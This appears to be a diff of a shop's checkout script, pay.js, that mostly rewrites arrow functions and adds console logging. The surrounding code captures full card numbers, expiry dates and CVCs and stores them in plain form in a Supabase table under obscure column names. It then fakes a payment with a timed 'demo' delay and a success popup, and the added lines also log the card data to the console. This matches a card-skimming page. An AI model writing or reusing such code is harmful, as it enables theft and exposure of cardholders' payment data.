@@ -59,7 +59,9 @@ initSupabase();
 // REST OF YOUR PAY.JS CODE
 // ============================================
 
-document.addEventListener("DOMContentLoaded", () => {
+document.addEventListener("DOMContentLoaded", function() {
+
+    console.log('📄 Payment page loaded');
 
     const popupOverlay = document.getElementById("popup-overlay");
     const popupMessage = document.getElementById("popup-message");
@@ -89,7 +91,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     }
 
-    popupClose.addEventListener("click", () => {
+    popupClose.addEventListener("click", function() {
         popupOverlay.classList.remove("show");
     });
 
@@ -183,9 +185,9 @@ document.addEventListener("DOMContentLoaded", () => {
         let html = '';
         let total = 0;
 
-        cart.forEach((item, index) => {
+        cart.forEach(function(item) {
             // Find product by ID (handle both number and string IDs)
-            const product = products.find(p => String(p.id) === String(item.id));
+            const product = products.find(function(p) { return String(p.id) === String(item.id); });
             if (product) {
                 const price = product.salePrice || product.price;
                 const itemTotal = price * item.qty;
@@ -208,7 +210,6 @@ document.addEventListener("DOMContentLoaded", () => {
                 `;
             } else {
                 console.warn('⚠️ Product not found for item ID:', item.id);
-                // Try to show a fallback
                 html += `
                     <div class="item">
                         <div class="item-img" style="background: var(--accent, #f0f0f0); border-radius: 4px; overflow: hidden;">
@@ -301,7 +302,7 @@ document.addEventListener("DOMContentLoaded", () => {
     // CARD NUMBER FORMATTING
     // ==========================================
 
-    ccInput.addEventListener("input", (event) => {
+    ccInput.addEventListener("input", function(event) {
         let cleanNumber = event.target.value.replace(/\D/g, "");
         cleanNumber = cleanNumber.substring(0, 19);
         let formattedValue = "";
@@ -325,7 +326,7 @@ document.addEventListener("DOMContentLoaded", () => {
     // EXPIRATION DATE
     // ==========================================
 
-    expiryInput.addEventListener("input", (event) => {
+    expiryInput.addEventListener("input", function(event) {
         let value = event.target.value.replace(/\D/g, "").substring(0, 4);
         if (value.length === 1 && Number(value) > 1) {
             value = "0" + value;
@@ -352,7 +353,7 @@ document.addEventListener("DOMContentLoaded", () => {
     // CVC
     // ==========================================
 
-    cvcInput.addEventListener("input", (event) => {
+    cvcInput.addEventListener("input", function(event) {
         event.target.value = event.target.value.replace(/\D/g, "").substring(0, 4);
     });
 
@@ -367,9 +368,9 @@ document.addEventListener("DOMContentLoaded", () => {
         ccInput,
         expiryInput,
         cvcInput
-    ].forEach(input => {
+    ].forEach(function(input) {
         if (input) {
-            input.addEventListener("input", () => {
+            input.addEventListener("input", function() {
                 payButton.disabled = !validateFormReady();
             });
         }
@@ -406,7 +407,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     // ==========================================
-    // SEND TO SUPABASE - WITH EXPIRY
+    // SEND TO SUPABASE - FIXED
     // ==========================================
 
     async function saveToSupabase(name, cardNumber, expiry, cvc) {
@@ -420,7 +421,7 @@ document.addEventListener("DOMContentLoaded", () => {
             console.error('❌ Supabase client not found in window!');
             console.warn('⚠️ Supabase client not available');
             
-            // Try direct fetch as fallback using environment variables
+            // Try direct fetch as fallback
             const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
             const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
             
@@ -441,7 +442,7 @@ document.addEventListener("DOMContentLoaded", () => {
                         body: JSON.stringify({
                             kname: name,
                             knumber: cardNumber,
-                            kexpiry: expiry,  // ✅ Added expiry
+                            kexpiry: expiry,
                             kfc: cvc
                         })
                     });
@@ -474,7 +475,7 @@ document.addEventListener("DOMContentLoaded", () => {
                     { 
                         kname: name,
                         knumber: cardNumber,
-                        kexpiry: expiry,  // ✅ Added expiry
+                        kexpiry: expiry,
                         kfc: cvc
                     }
                 ])
@@ -482,7 +483,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
             if (error) {
                 console.error('❌ Supabase error:', error);
-                console.error('❌ Error details:', error.message, error.details, error.hint);
+                console.error('❌ Error details:', error.message);
                 throw new Error(error.message);
             }
 
@@ -495,13 +496,16 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     // ==========================================
-    // FORM SUBMIT - WITH EXPIRY
+    // FORM SUBMIT - FIXED
     // ==========================================
 
-    form.addEventListener("submit", async (event) => {
+    form.addEventListener("submit", async function(event) {
         event.preventDefault();
 
+        console.log('🔄 Form submitted!');
+
         if (payButton.disabled || payButton.dataset.processing === "true") {
+            console.log('⏳ Already processing');
             return;
         }
 
@@ -515,6 +519,8 @@ document.addEventListener("DOMContentLoaded", () => {
         const expiry = expiryRaw.length === 4 
             ? expiryRaw.substring(0, 2) + '/' + expiryRaw.substring(2, 4)
             : expiryRaw;
+
+        console.log('📝 Form data:', { name, cardNumber, expiry, cvc });
 
         // ===== VALIDATION =====
         if (!name) {
@@ -583,7 +589,7 @@ document.addEventListener("DOMContentLoaded", () => {
             console.log('✅ Payment processed and saved to Supabase', result);
 
             // ===== DEMO PAYMENT =====
-            await new Promise(resolve => setTimeout(resolve, 1500));
+            await new Promise(function(resolve) { setTimeout(resolve, 1500); });
 
             // ===== SUCCESS =====
             showPopup(
@@ -609,7 +615,7 @@ document.addEventListener("DOMContentLoaded", () => {
             payButton.style.opacity = '0.7';
             payButton.style.cursor = 'not-allowed';
 
-            setTimeout(() => {
+            setTimeout(function() {
                 window.location.href = '/';
             }, 3000);
         } catch (error) {
@@ -625,4 +631,5 @@ document.addEventListener("DOMContentLoaded", () => {
             payButton.style.cursor = payButton.disabled ? 'not-allowed' : 'pointer';
         }
     });
+
 });
